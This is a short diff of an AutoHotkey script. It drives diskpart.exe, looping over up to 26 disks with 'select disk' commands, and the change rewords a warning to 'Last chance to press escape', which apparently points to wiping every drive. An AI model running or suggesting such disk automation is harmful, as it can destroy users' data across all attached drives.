@@ -15,7 +15,7 @@ Sleep, 3000
 WinActivate, C:\WINDOWS\SYSTEM32\diskpart.exe
 WinWaitActive, C:\WINDOWS\SYSTEM32\diskpart.exe
 sleep, 100
-MsgBox, balls
+MsgBox, Last chance to press escape
 Loop, 26
 {
 	Send, select disk %drives% {Enter}
